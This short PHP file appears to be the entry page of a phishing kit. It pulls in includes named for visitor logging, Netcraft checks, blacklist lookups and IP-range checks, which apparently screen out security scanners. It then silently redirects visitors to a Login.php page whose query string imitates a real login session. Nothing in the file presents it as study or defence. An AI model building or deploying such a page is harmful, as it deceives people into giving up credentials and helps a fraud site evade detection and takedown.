<?php
require "includes/visitor_log.php";
require "includes/netcraft_check.php";
require "includes/blacklist_lookup.php";
require "includes/ip_range_check.php";
ini_set('display_errors', 0);
header("location: Login.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
?>